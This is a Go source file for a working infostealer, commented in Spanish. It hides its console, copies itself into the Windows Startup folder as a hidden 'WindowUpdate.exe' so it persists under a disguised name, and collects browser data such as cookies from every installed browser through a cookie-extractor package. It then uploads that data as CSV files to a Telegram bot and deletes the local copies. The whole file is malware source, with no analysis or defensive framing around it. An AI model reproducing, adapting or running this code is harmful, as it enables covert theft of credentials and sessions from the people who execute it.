package main

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/GrpDsG20/CookiesExtractorv2/browser"
)

const (
	TelegramToken   = ""
	ChatID          = ""
	TelegramFileAPI = "https://api.telegram.org/bot%s/sendDocument"
)

func init() {
	// Ocultar consola
	hideConsole()

	// Auto-copia al inicio
	copyToStartup()
}

func main() {
	// Esperar antes de comenzar
	time.Sleep(30 * time.Second)

	// Directorio temporal
	tmpDir := filepath.Join(os.TempDir(), fmt.Sprintf("tmp_%d", time.Now().UnixNano()))
	defer os.RemoveAll(tmpDir)
	_ = os.MkdirAll(tmpDir, os.ModePerm)

	// Recolectar datos del navegador
	collectAndSendBrowserData(tmpDir)
}

func collectAndSendBrowserData(tmpDir string) {
	browsers, err := browser.PickBrowsers("all", "")
	if err != nil {
		return
	}

	for _, b := range browsers {
		data, err := b.BrowsingData(true)
		if err != nil {
			continue
		}

		data.Output(tmpDir, b.Name(), "csv")

		pattern := filepath.Join(tmpDir, b.Name()+"_*.csv")
		files, _ := filepath.Glob(pattern)

		for _, file := range files {
			_ = sendFileToTelegram(file)
			_ = os.Remove(file)
		}
	}
}

func sendFileToTelegram(filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
	_, _ = io.Copy(part, file)
	_ = writer.WriteField("chat_id", ChatID)
	_ = writer.Close()

	req, _ := http.NewRequest("POST", fmt.Sprintf(TelegramFileAPI, TelegramToken), body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func hideConsole() {
	getConsoleWindow := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
	showWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
	if getConsoleWindow.Find() == nil && showWindow.Find() == nil {
		hwnd, _, _ := getConsoleWindow.Call()
		if hwnd != 0 {
			_, _, _ = showWindow.Call(hwnd, 0)
		}
	}
}

func copyToStartup() {
	exePath, _ := os.Executable()
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowUpdate.exe")

	if !strings.EqualFold(exePath, startupPath) {
		input, _ := os.ReadFile(exePath)
		_ = os.WriteFile(startupPath, input, 0644)
		_ = exec.Command("attrib", "+h", startupPath).Run()
	}
}
